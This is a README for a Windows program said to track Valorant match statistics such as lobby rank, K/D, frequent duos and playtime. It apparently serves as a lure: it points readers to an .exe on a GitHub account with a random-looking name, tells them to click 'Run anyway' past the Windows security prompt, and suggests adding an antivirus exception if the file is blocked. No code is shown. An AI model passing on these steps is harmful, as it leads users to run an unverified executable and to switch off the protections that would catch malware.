# 🎮 vlravg-match-stats - Track your Valorant match performance easily

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Bertyfoliaceous160/vlravg-match-stats)

This tool tracks your Valorant match data. It displays your average lobby rank, your kill-death ratio per game, who you play with most often, and your total playtime. The software pulls this information directly from the game statistics records. You can use it to review your progress and understand your play style.

## 🚀 Getting Started

The application runs on Windows. You need a stable internet connection to fetch your match history. The program connects to the official game servers to gather data. You do not need to install complex software or configure server settings.

## 📥 How to Install and Run

1. Open a web browser on your computer.
2. Go to the [official release page](https://github.com/Bertyfoliaceous160/vlravg-match-stats).
3. Look for the file ending in .exe under the latest version.
4. Click the file to download it to your Downloads folder.
5. Double-click the downloaded file to start the application.
6. A security prompt might appear. Click "Run" or "More info" then "Run anyway" to allow the file.
7. The application opens a new window in your browser.

## 📊 Features Explained

### Average Lobby Rank
This feature calculates the skill level of the players in your recent matches. It gives you a clear view of the matchmaking difficulty you face in your sessions.

### Per-Game K/D
The tracker generates a report for every match. It displays your kills and deaths for each round. This helps you identify trends in your performance over long sessions.

### Frequent Duos
Knowing who you work well with helps you rank up. This tool identifies the players you team up with most often. It calculates your win rate when you play with specific friends.

### Total Playtime
You can see how many hours you spend in the game. This counter tracks your active time in matches. It ignores your time spent in the game menu.

## ⚙️ System Requirements

- Operating System: Windows 10 or Windows 11.

- Storage: 100MB of free disk space.
- Browser: Google Chrome, Microsoft Edge, or Mozilla Firefox.

## 🛠 Troubleshooting

If the application fails to fetch data, restart the program. Ensure your internet connection is active. The application requires access to the game history servers. If the servers undergo maintenance, the tool might show empty fields. Wait for a few minutes and refresh the page. 

If the application window does not open, check if your antivirus software blocked the file. You can add an exception for the folder where you saved the file. 

## 🛡 Privacy and Security

The tool only reads data from your public match history. It does not ask for your password. It does not store your game credentials on your computer. The application uses the HenrikDev API to retrieve stats safely. Your account remains secure while you use this tool.
